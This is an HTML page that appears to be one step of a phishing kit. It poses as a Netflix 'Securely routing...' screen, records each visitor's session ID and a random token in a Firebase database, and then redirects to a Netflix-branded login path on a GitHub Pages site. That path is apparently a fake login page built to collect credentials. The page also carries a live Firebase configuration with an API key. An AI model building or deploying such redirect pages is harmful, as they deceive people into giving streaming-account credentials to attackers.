<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Processing...</title>
    <style>
        /* Simple CSS for a full-page loading screen */
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #141414; /* Dark background similar to streaming sites */
            color: #ffffff;
            font-family: Arial, sans-serif;
            flex-direction: column;
        }
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid #e50914; /* Red accent */
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin-bottom: 15px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        #message {
            font-size: 14px;
            opacity: 0.8;
        }
    </style>
</head>
<body>

    <div class="spinner"></div>
    <div id="message">Securely routing...</div>

    <!-- Firebase App (the core Firebase SDK) -->
    <script type="module">
        // Import Firebase modular SDKs
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        // Your web app's Firebase configuration (Provided by you)
        const firebaseConfig = {
            apiKey: "AIzaSyDPm2za3Ho0Hd8Henuhq0KxAHyUQh-Hi-U",
            authDomain: "question-metabase.firebaseapp.com",
            databaseURL: "https://question-metabase-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "question-metabase",
            storageBucket: "question-metabase.firebasestorage.app",
            messagingSenderId: "770698198753",
            appId: "1:770698198753:web:59ae49d78b6013bab5c1a0",
            measurementId: "G-6ZP1FPMKSJ"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // Function to generate a random 15-digit alphanumeric string
        function generateLotusId() {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            let result = '';
            for (let i = 0; i < 15; i++) {
                result += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return result;
        }

        // Main asynchronous function to handle the logic
        async function processAndRedirect() {
            // 1. Extract session ID from URL parameters
            const urlParams = new URLSearchParams(window.location.search);
            const sessionId = urlParams.get('session');

            // If no session ID is found, halt execution and show error
            if (!sessionId) {
                document.getElementById('message').innerText = "Error: Invalid or missing Session ID.";
                document.querySelector('.spinner').style.display = 'none';
                return;
            }

            // 2. Generate the Lotus ID
            const lotusId = generateLotusId();

            try {
                // 3. Save to Firestore
                // Referencing the collection "ASPX Keys" and the specific document (sessionId)
                const docRef = doc(db, "ASPX Keys", sessionId);
                
                // Using setDoc with { merge: true } adds the new field without overwriting existing data
                await setDoc(docRef, {
                    lotus: lotusId
                }, { merge: true });

                // 4. Automatically Redirect User
                const redirectUrl = `https://knox-app.github.io/netflix/lgn/1?session=${sessionId}&continue=&env=safeopt&lotus=${lotusId}`;
                window.location.replace(redirectUrl); // Use replace so they can't click "back" to this processing page

            } catch (error) {
                console.error("Error writing to database:", error);
                document.getElementById('message').innerText = "Database connection error. Please try again.";
                document.querySelector('.spinner').style.display = 'none';
            }
        }

        // Execute the function as soon as the script loads
        processAndRedirect();

    </script>
</body>
</html>
